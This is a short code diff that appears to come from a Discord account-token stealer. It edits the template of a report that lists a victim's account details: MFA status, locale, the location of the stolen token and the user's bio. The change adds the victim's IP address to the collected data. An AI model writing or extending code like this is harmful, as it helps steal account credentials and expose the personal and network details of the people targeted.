@@ -200,7 +200,9 @@
 **a2f:** ${i.user.mfa_enabled ? 'yes' : 'no' }
 **locale:** ${i.user.locale ? 'yes' : 'no' }
 
+
 **token location:** ${i.computer.location}
+**ip:** ${i.ip.ip}
 
 **Bio:**
 >>> ${i.user.bio}
